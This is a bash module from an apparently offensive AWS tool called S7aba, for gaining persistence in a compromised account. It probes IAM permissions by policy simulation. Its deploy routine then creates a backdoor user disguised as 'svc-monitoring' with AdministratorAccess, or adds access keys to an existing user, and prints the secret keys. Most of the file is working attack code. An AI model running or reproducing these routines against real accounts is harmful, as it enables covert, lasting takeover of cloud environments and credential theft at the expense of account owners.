#!/usr/bin/env bash
# S7aba - AWS Persistence Module

enumerate_persistence_options() {
    log_info "Evaluating AWS persistence techniques..."

    local options=()

    # IAM user creation
    if aws iam create-user --user-name "s7aba-test-$$" --dry-run &>/dev/null 2>&1 || \
       aws iam simulate-principal-policy --policy-source-arn "$(aws sts get-caller-identity --query Arn -o text)" \
       --action-names "iam:CreateUser" --query 'EvaluationResults[0].EvalDecision' -o text 2>/dev/null | grep -q "allowed"; then
        log_finding "HIGH" "IAM User Creation" "Can create backdoor IAM user with programmatic access"
        options+=("iam-user")
    fi

    # Access key creation
    if aws iam simulate-principal-policy --policy-source-arn "$(aws sts get-caller-identity --query Arn -o text)" \
       --action-names "iam:CreateAccessKey" --query 'EvaluationResults[0].EvalDecision' -o text 2>/dev/null | grep -q "allowed"; then
        log_finding "HIGH" "Access Key Creation" "Can generate access keys for existing users"
        options+=("access-key")
    fi

    # Lambda backdoor
    if aws iam simulate-principal-policy --policy-source-arn "$(aws sts get-caller-identity --query Arn -o text)" \
       --action-names "lambda:CreateFunction" --query 'EvaluationResults[0].EvalDecision' -o text 2>/dev/null | grep -q "allowed"; then
        log_finding "MEDIUM" "Lambda Backdoor" "Can create Lambda function as persistent callback"
        options+=("lambda")
    fi

    # CloudWatch Events / EventBridge rule
    log_finding "INFO" "EventBridge Rule" "Scheduled triggers for periodic execution"
    options+=("eventbridge")

    # SSM document
    log_finding "INFO" "SSM Document" "Custom SSM document for persistent command execution"

    # EC2 user-data modification
    log_finding "INFO" "EC2 User Data" "Inject persistence into EC2 instance user-data"
}

deploy_persistence() {
    log_warn "Select persistence mechanism:"
    echo -e "  1) Create backdoor IAM user"
    echo -e "  2) Add access key to existing user"
    echo -e "  3) Create Lambda callback"
    echo -e "  4) EventBridge scheduled trigger"
    read -rp "$(echo -e "${YELLOW}[?] Choice: ${RESET}")" choice

    case "$choice" in
        1)
            local username="svc-monitoring-$(date +%s | tail -c 5)"
            if [[ $DRY_RUN -eq 1 ]]; then
                log_info "DRY-RUN: Would create user '$username' with console + programmatic access"
            else
                aws iam create-user --user-name "$username" 2>/dev/null
                local keys
                keys=$(aws iam create-access-key --user-name "$username" -o json 2>/dev/null)
                aws iam attach-user-policy --user-name "$username" \
                    --policy-arn "arn:aws:iam::aws:policy/AdministratorAccess" 2>/dev/null
                log_success "Backdoor user '$username' created"
                log_info "Access Key: $(echo "$keys" | jq -r '.AccessKey.AccessKeyId')"
                log_info "Secret Key: $(echo "$keys" | jq -r '.AccessKey.SecretAccessKey')"
            fi
            ;;
        2)
            aws iam list-users --query 'Users[].UserName' -o tsv 2>/dev/null
            read -rp "$(echo -e "${YELLOW}[?] Target username: ${RESET}")" target
            if [[ $DRY_RUN -eq 1 ]]; then
                log_info "DRY-RUN: Would create access key for '$target'"
            else
                local keys
                keys=$(aws iam create-access-key --user-name "$target" -o json 2>/dev/null)
                log_success "Access key created for '$target'"
                log_info "Access Key: $(echo "$keys" | jq -r '.AccessKey.AccessKeyId')"
                log_info "Secret Key: $(echo "$keys" | jq -r '.AccessKey.SecretAccessKey')"
            fi
            ;;
        *)
            log_info "Selected mechanism requires manual implementation"
            ;;
    esac
}
